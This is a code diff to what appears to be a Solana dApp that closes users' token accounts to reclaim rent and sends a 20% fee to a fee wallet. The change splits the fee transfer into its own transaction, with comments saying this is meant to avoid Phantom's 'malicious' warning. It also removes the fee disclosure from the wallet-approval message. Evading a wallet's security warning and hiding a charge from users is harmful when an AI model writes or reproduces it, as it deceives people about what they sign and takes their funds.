@@ -290,7 +290,7 @@ function HomeContent() {
       // Calculate fee (20% of total lamports)
       const totalFeeAmount = Math.floor(totalLamports * FEE_PERCENTAGE);
       
-      // Create instructions array
+      // Create instructions array for closing accounts
       const instructions = tokenAccountsToBurn.map(account => 
         spl.createCloseAccountInstruction(
           account.pubkey,
@@ -299,9 +299,13 @@ function HomeContent() {
         )
       );
       
+      // Create a separate transaction for the fee transfer
+      // This makes the intent clearer to Phantom and should avoid the malicious warning
+      const feeTransaction = new Transaction();
+      
       // Add fee transfer instruction if applicable
       if (totalFeeAmount > 0) {
-        instructions.push(
+        feeTransaction.add(
           SystemProgram.transfer({
             fromPubkey: publicKey,
             toPubkey: FEE_WALLET,
@@ -311,13 +315,22 @@ function HomeContent() {
       }
       
       const numAccounts = tokenAccountsToBurn.length;
-      toast.loading(`Please approve the transaction in your wallet. This will close ${numAccounts} ${numAccounts === 1 ? 'account' : 'accounts'} and return rent SOL minus a small fee.`, { id: 'transaction-prep' });
+      toast.loading(`Please approve the transaction in your wallet. This will close ${numAccounts} ${numAccounts === 1 ? 'account' : 'accounts'} and return rent SOL.`, { id: 'transaction-prep' });
       
+      // First send the transaction to close accounts
       const signature = await signAndSendTransaction(provider, instructions, connection);
       
       toast.loading('Closing accounts...', { id: 'transaction-prep' });
       
       await connection.confirmTransaction(signature);
+      
+      // Then send the fee transaction separately if needed
+      let feeSignature = null;
+      if (totalFeeAmount > 0) {
+        toast.loading('Processing fee transaction...', { id: 'transaction-prep' });
+        feeSignature = await signAndSendTransaction(provider, [feeTransaction.instructions[0]], connection);
+        await connection.confirmTransaction(feeSignature);
+      }
       
       const netAmount = totalLamports - totalFeeAmount;
       toast.success(`Successfully claimed ${(netAmount / LAMPORTS_PER_SOL).toFixed(4)} SOL!`, { id: 'transaction-prep' });
